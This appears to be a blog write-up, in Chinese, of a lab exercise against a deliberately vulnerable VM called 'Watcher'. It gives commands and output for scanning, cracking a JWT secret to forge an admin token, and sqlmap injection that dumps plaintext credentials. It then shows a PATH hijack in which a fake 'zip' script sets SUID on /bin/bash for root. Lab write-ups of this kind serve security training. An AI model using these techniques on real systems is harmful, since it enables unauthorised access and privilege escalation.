@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 信息收集与端口探测
+
+打靶第一步老规矩，先找出目标机器的 IP 地址。">
+<meta property="og:title" content="内部_Watcher">
+<meta property="og:description" content="# 信息收集与端口探测
+
+打靶第一步老规矩，先找出目标机器的 IP 地址。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Watcher.html">
+<meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
+<title>内部_Watcher</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Watcher</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/296" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>信息收集与端口探测</h1>
+<p>打靶第一步老规矩，先找出目标机器的 IP 地址。这里我用 arp-scan 扫了一下当前 VMware 的网段。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l       
+[sudo] password <span class="pl-k">for</span> kali:                                          
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
+192.168.205.197 08:00:27:1d:84:c7       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:ef:3c:30       VMware, Inc.</pre></div>
+<p>确认靶机 IP 为 192.168.205.197，接着对目标进行全端口扫描。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.197
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 09:07 -0400
+Nmap scan report <span class="pl-k">for</span> 192.168.205.197
+Host is up (0.00032s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+MAC Address: 08:00:27:1D:84:C7 (Oracle VirtualBox virtual NIC)</pre></div>
+<p>目标只开了 22 的 SSH 和 5000 端口，重点关注 5000 端口上的 Web 服务。</p>
+<h1>Web 渗透：JWT 伪造到后台注入</h1>
+<p>访问 5000 端口发现是一个登录窗口，我习惯性地试了几组弱口令，没成功，于是自己注册了一个普通用户进去。跳转到仪表盘后，提示当前等级为 Normal，且系统管理页限制只有 admin 才能进。</p>
+<p>这里抓个包看了一下请求头。</p>
+<div class="highlight highlight-source-httpspec"><pre class="notranslate"><span class="pl-k">GET</span><span class="pl-c1"> /dashboard HTTP/1.1</span>
+<span class="pl-s"><span class="pl-v">Host:</span> 192.168.205.197:5000</span>
+<span class="pl-s"><span class="pl-v">Cookie:</span> token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImxsMTA0NTY3IiwibGV2ZWwiOiJub3JtYWwiLCJpYXQiOjE3ODA0MDU3MjIsImV4cCI6MTc4MDQwOTMyMn0.wp2jI4M_tscZVSjq45nfhUjRwmCNcxdKcXuo0I3hoAM</span></pre></div>
+<p>Cookie 里带有明显的 JWT 凭证，解码后看到 payload 里有用户名和权限等级信息。既然有 JWT，尝试爆破一下它的签名密钥。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImxsMTA0NTY3IiwibGV2ZWwiOiJub3JtYWwiLCJpYXQiOjE3ODA0MDU3MjIsImV4cCI6MTc4MDQwOTMyMn0.wp2jI4M_tscZVSjq45nfhUjRwmCNcxdKcXuo0I3hoAM<span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>
+                                                                                                                                                                                
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span> 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="pl-c1">hash</span> (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
+Will run 8 OpenMP threads
+Press <span class="pl-s"><span class="pl-pds">'</span>q<span class="pl-pds">'</span></span> or Ctrl-C to abort, almost any other key <span class="pl-k">for</span> status
+maze             (<span class="pl-k">?</span>)   
+1g 0:00:00:00 DONE (2026-06-02 09:10) 2.040g/s 11635Kp/s 11635Kc/s 11635KC/s me2uebars..maycee09</pre></div>
+<p>字典跑到一半就出结果了，密钥是 <code class="notranslate">maze</code>。接下来直接去 jwt.io 或者其它工具网站，把 data 里的 username 和 level 全改成 admin，用拿到的密钥重新生成签名的 Token。替换掉原本的 Cookie 后，我成功进入了系统管理界面。</p>
+<h2>API 接口 SQL 注入</h2>
+<p>进到后台后，页面看起来没什么敏感配置，但我翻看前端源码发现，点击设置按钮会向 <code class="notranslate">/api/settings/update</code> 接口发送一段 JSON 数据。我直接用 curl 构造了一个带单引号的 payload 过去测试。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">curl -s -X POST <span class="pl-smi">$U</span> -H <span class="pl-s"><span class="pl-pds">"</span>Content-Type: application/json<span class="pl-pds">"</span></span> -b <span class="pl-s"><span class="pl-pds">"</span>token=<span class="pl-smi">$TOKEN</span><span class="pl-pds">"</span></span> -d <span class="pl-s"><span class="pl-pds">"</span>{<span class="pl-cce">\"</span>key<span class="pl-cce">\"</span>:<span class="pl-cce">\"</span>theme'<span class="pl-cce">\"</span>,<span class="pl-cce">\"</span>value<span class="pl-cce">\"</span>:<span class="pl-cce">\"</span>dark<span class="pl-cce">\"</span>}<span class="pl-pds">"</span></span>
+{<span class="pl-s"><span class="pl-pds">"</span>code<span class="pl-pds">"</span></span>:500,<span class="pl-s"><span class="pl-pds">"</span>msg<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u6570\u636e\u5e93\u9519\u8bef: unrecognized token: <span class="pl-cce">\"</span>'theme''<span class="pl-cce">\"</span><span class="pl-pds">"</span></span>}</pre></div>
+<p>回显报错了，而且暴露了后端用的是 SQLite 数据库。有明显注入点，懒得手工注了，直接把包丢给 sqlmap。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sqlmap -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.197:5000/api/settings/update<span class="pl-pds">"</span></span> --method POST --headers=<span class="pl-s"><span class="pl-pds">"</span>Content-Type: application/json<span class="pl-pds">"</span></span> --cookie=<span class="pl-s"><span class="pl-pds">"</span>token=<span class="pl-smi">$TOKEN</span><span class="pl-pds">"</span></span> --data=<span class="pl-s"><span class="pl-pds">'</span>{"key":"theme*","value":"dark"}<span class="pl-pds">'</span></span> --dbms=sqlite --batch --tables --threads=10 --no-cast
+
++-----------------+
+<span class="pl-k">|</span> secret          <span class="pl-k">|</span>
+<span class="pl-k">|</span> settings        <span class="pl-k">|</span>
+<span class="pl-k">|</span> sqlite_sequence <span class="pl-k">|</span>
+<span class="pl-k">|</span> users           <span class="pl-k">|</span>
++-----------------+</pre></div>
+<p>跑出四张表，<code class="notranslate">secret</code> 表看着最有货，继续 dump 里面的数据。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ sqlmap -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.197:5000/api/settings/update<span class="pl-pds">"</span></span> --method POST --headers=<span class="pl-s"><span class="pl-pds">"</span>Content-Type: application/json<span class="pl-pds">"</span></span> --cookie=<span class="pl-s"><span class="pl-pds">"</span>token=<span class="pl-smi">$TOKEN</span><span class="pl-pds">"</span></span> --data=<span class="pl-s"><span class="pl-pds">'</span>{"key":"theme*","value":"dark"}<span class="pl-pds">'</span></span> --dbms=sqlite --batch --tables --threads=10 --no-cast -T secret --dump
+
+[1 entry]
++----+----------------------------------+
+<span class="pl-k">|</span> id <span class="pl-k">|</span> secret                           <span class="pl-k">|</span>
++----+----------------------------------+
+<span class="pl-k">|</span> 1  <span class="pl-k">|</span> watcher:mazesec123q1231w<span class="pl-k">!</span>@<span class="pl-c"><span class="pl-c">#!</span>@@#$ |</span>
++----+----------------------------------+</pre></div>
+<p>成功拿到一组明文账号密码。</p>
+<h1>初始立足点</h1>
+<p>拿到凭证后，回想之前探测到的 22 端口，直接用这个账号密码通过 SSH 连上去。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">watcher@Watcher:<span class="pl-k">~</span>$ id
+uid=1000(watcher) gid=1000(watcher) groups=1000(watcher),100(users)</pre></div>
+<p>登录成功，拿到普通用户权限。</p>
+<h1>本地提权：监控进程与路径劫持</h1>
+<p>在靶机里翻找了一段时间，发现当前目录下有个 <code class="notranslate">uploads</code> 目录，不知道干嘛用的。另外 <code class="notranslate">/opt/</code> 下面有个叫 <code class="notranslate">autoarchive</code> 的文件夹，但是当前用户没权限进去看。</p>
+<p>这种场景通常有定时任务或者后台监控进程在跑。我从本地起个 HTTP 服务，传了一个进程监控工具进去。这里我没有用常规的 pspy，而是用了 kozmer 大佬二开的 rspy，因为 pspy 有时候对瞬间执行的进程不够敏感。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">watcher@Watcher:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> /tmp/
+watcher@Watcher:/tmp$ <span class="pl-c1">cd</span> /tmp<span class="pl-k">;</span>busybox wget 192.168.205.128/rspy<span class="pl-k">;</span>chmod +x /tmp/rspy
+watcher@Watcher:/tmp$ ./rspy --dbus --dbus-interval 1</pre></div>
+<p>刚跑起来，终端就弹出了几条历史记录。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">2026-06-02 09:29:57 CMD <span class="pl-c1">:</span> UID=0     PID=394      <span class="pl-k">|</span> inotifywait -m -e create /home/watcher/uploads
+2026-06-02 09:29:57 CMD <span class="pl-c1">:</span> UID=0     PID=395      <span class="pl-k">|</span> /bin/bash /opt/autoarchive/sync.sh</pre></div>
+<p>这说明后台有个 root 权限的 <code class="notranslate">inotifywait</code> 在死盯着 <code class="notranslate">/home/watcher/uploads</code> 目录的 create 事件，一旦触发就会执行 <code class="notranslate">sync.sh</code>。</p>
+<h2>摸索触发条件与抓包盲区</h2>
+<p>我尝试在 uploads 里随便建个文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">watcher@Watcher:<span class="pl-k">~</span>/uploads$ touch 1</pre></div>
+<p>没有任何反应。后面经过反复测试，发现文件名必须带 <code class="notranslate">.txt</code> 后缀才能触发。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">watcher@Watcher:<span class="pl-k">~</span>/uploads$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>123123<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> a.txt</pre></div>
+<div class="highlight highlight-source-shell"><pre class="notranslate">2026-06-02 09:36:43 DBUS: UID=0     PID=700      <span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">"</span>[sync.sh]<span class="pl-pds">"</span></span>
+2026-06-02 09:36:43 CMD <span class="pl-c1">:</span> UID=0     PID=700      <span class="pl-k">|</span> sleep 3
+2026-06-02 09:36:46 DBUS: UID=0     PID=701      <span class="pl-k">|</span> /bin/bash /opt/autoarchive/archive-helper a.txt
+2026-06-02 09:36:46 DBUS: UID=0     PID=702      <span class="pl-k">|</span> /bin/bash /opt/autoarchive/archive-helper a.txt</pre></div>
+<p>触发是触发了，但进程监控里只看到了它调用 <code class="notranslate">archive-helper</code>，由于底层其实执行的是 zip 压缩，速度太快，连 rspy 抓 proc 目录都漏掉了具体执行了什么系统命令。</p>
+<p>为了看清它底层到底敲了什么命令，得想办法让这个进程“慢下来”或者卡住。我想到几个路子：<br>
+一是死磕运气，多建几个文件让 rspy 瞎猫碰死耗子抓一次。<br>
+二是塞个极大的文件进去，强行拖慢 zip 的压缩时间。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">watcher@Watcher:<span class="pl-k">~</span>/uploads$ dd if=/dev/zero of=big.txt bs=1M count=512
+512+0 records <span class="pl-k">in</span>
+512+0 records out
+536870912 bytes (537 MB, 512 MiB) copied, 1.1236 s, 478 MB/s</pre></div>
+<p>这招运气好确实能看清命令，但后来我用到一个 111 大佬教的奇招：直接在文件名里带上横杠 <code class="notranslate">-</code>。</p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/23de102d3b946aa9910c3398d8559bc259bd7494cce7577229cb98a54989d83c/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303236303630343138303235353736332e77656270"><img src="https://camo.githubusercontent.com/23de102d3b946aa9910c3398d8559bc259bd7494cce7577229cb98a54989d83c/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303236303630343138303235353736332e77656270" alt="E005D6C945C3C44B20EE2E7D7E255088" data-canonical-src="http://7r1UMPHK.github.io/image/20260604180255763.webp" style="max-width: 100%;"></a></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">watcher@Watcher:<span class="pl-k">~</span>/uploads$ <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> <span class="pl-s"><span class="pl-pds">"</span>./- a.txt<span class="pl-pds">"</span></span></pre></div>
+<p>这个文件一建出来，进程就直接卡死了。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">2026-06-02 09:43:05 DBUS: UID=0     PID=745      <span class="pl-k">|</span> /bin/bash /opt/autoarchive/archive-helper <span class="pl-s"><span class="pl-pds">"</span>- a.txt<span class="pl-pds">"</span></span>
+2026-06-02 09:43:05 DBUS: UID=0     PID=746      <span class="pl-k">|</span> /bin/bash /opt/autoarchive/archive-helper <span class="pl-s"><span class="pl-pds">"</span>- a.txt<span class="pl-pds">"</span></span>
+2026-06-02 09:43:05 CMD <span class="pl-c1">:</span> UID=0     PID=745      <span class="pl-k">|</span> /bin/bash /opt/autoarchive/archive-helper - a.txt
+2026-06-02 09:43:05 CMD <span class="pl-c1">:</span> UID=0     PID=746      <span class="pl-k">|</span> zip -q /root/backups/latest.zip - a.txt</pre></div>
+<p>连敲 <code class="notranslate">ps aux</code> 都能看得一清二楚。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root         745  0.0  0.1   7084  3388 <span class="pl-k">?</span>        S    09:43   0:00 /bin/bash /opt/autoarchive/archive-helper - a.txt
+root         746  0.0  0.1   6176  2484 <span class="pl-k">?</span>        S    09:43   0:00 zip -q /root/backups/latest.zip - a.txt</pre></div>
+<p>原来后台执行的是 <code class="notranslate">zip</code> 命令，文件名带 <code class="notranslate">-</code> 时，zip 会把它误认为参数去等待标准输入，导致进程被一直挂起。</p>
+<h2>环境变量劫持提权</h2>
+<p>最关键的信息来了：脚本调用 <code class="notranslate">zip -q /root/backups/latest.zip</code> 时，<strong>没有写绝对路径</strong>。且程序的工作目录明显就在我可控的 <code class="notranslate">uploads</code> 目录下。这就好办了，直接在当前目录写一个恶意的 <code class="notranslate">zip</code> 同名脚本进行劫持。</p>
+<p>由于刚才用横杠大法把进程卡死了，为了继续利用，我把靶机重启了一下。重新连上后，开始构造 payload。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">watcher@Watcher:<span class="pl-k">~</span>/uploads$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod +s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> zip
+watcher@Watcher:<span class="pl-k">~</span>/uploads$ chmod +x zip </pre></div>
+<p>在 <code class="notranslate">uploads</code> 目录下伪造了一个 zip 执行文件，作用是给 bash 赋 SUID 权限。接着随便建个 <code class="notranslate">.txt</code> 文件去触发监控。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">watcher@Watcher:<span class="pl-k">~</span>/uploads$ touch 1.txt
+watcher@Watcher:<span class="pl-k">~</span>/uploads$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1298416 Mar  8 11:21 /bin/bash</pre></div>
+<p>触发成功，查看 <code class="notranslate">/bin/bash</code> 发现 SUID 位已经亮了。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">watcher@Watcher:<span class="pl-k">~</span>/uploads$ /bin/bash -p
+bash-5.2# id
+uid=1000(watcher) gid=1000(watcher) euid=0(root) egid=0(root) groups=0(root),100(users),1000(watcher)
+bash-5.2# cat /root/root.txt /home/watcher/user.txt 
+flag{root-6661e4dc99e9408984d16d30b0c0730c}
+flag{user-c3949567202847f1ad8664095f0a94e4}</pre></div>
+<p>直接拿 shell，成功获取 root 权限并读到两个 flag。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
